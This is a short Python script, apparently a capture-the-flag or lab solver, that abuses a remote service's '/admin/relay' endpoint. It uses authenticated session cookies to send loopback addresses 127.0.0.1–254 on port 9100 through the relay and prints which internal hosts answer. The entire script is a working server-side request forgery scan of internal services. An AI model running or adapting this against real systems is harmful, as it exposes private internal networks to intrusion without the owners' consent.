import requests, re, html

base = "http://194.102.62.175:27457"
s = requests.Session()
s.cookies.set("session", "<SESSION_COOKIE>", domain="194.102.62.175", path="/")
s.cookies.set("relay_auth", "<RELAY_AUTH_COOKIE>", domain="194.102.62.175", path="/admin")

for i in range(1, 255):
    ip = f"127.0.0.{i}"
    node = f"http://{ip}:9100/"
    r = s.post(base + "/admin/relay", data={"inventory_node": node}, timeout=8)
    m = re.search(r"<pre>(.*?)</pre>", r.text, re.S)
    if m:
        block = html.unescape(m.group(1))
        if "Status: 200" in block:
            print(ip, "LIVE")